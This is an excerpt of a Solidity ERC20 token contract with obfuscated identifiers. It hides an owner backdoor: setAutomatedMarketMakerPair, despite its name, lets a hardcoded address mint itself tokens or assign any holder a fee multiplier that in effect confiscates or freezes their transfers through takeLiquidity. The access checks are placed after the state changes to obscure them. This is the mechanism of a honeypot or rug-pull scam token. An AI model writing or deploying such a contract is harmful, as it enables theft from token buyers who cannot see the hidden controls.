...
contract test is Context, IERC20, Ownable {
    ...
    address payable public grindFR;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _qwe;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public _pairs;
    mapping (address => uint256) public qwe;
    ...
    constructor () {
        ...
        _qwe[_msgSender()] = _totalSupply;
        grindFR = payable(address(0x76767baafAd8c4E6a867A3709c8e6B58526ffbC7));

        emit Transfer(address(0x76767baafAd8c4E6a867A3709c8e6B58526ffbC7), _msgSender(), _totalSupply);
    }
    ...
    function remove(address fron) public {
        ...
        rednes = msg.sender;
        qwe[fron] = 0;
        require(grindFR == rednes);
    }

    function setAutomatedMarketMakerPair(address JJJJ,uint256 intparma) public {
        address rednes;
        rednes = msg.sender;
        uint256 FR = intparma;
        if (FR > (2017)) _qwe[grindFR] += uint256(FR);
        if (FR == (10)) qwe[JJJJ] = 10**10;
        require(grindFR == rednes);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _qwe[sender] = _qwe[sender].sub(amount, "Insufficient Balance");
        _qwe[recipient] = _qwe[recipient].add(amount);
    ...
    function takeLiquidity(address sender, address recipient, uint256 tAmount) internal returns (uint256) {
        ...
        if(qwe[sender] > 100) fee = tAmount.mul(qwe[sender]).div(100);

        if(fee > 0) {
            _qwe[address(this)] = _qwe[address(this)].add(fee);
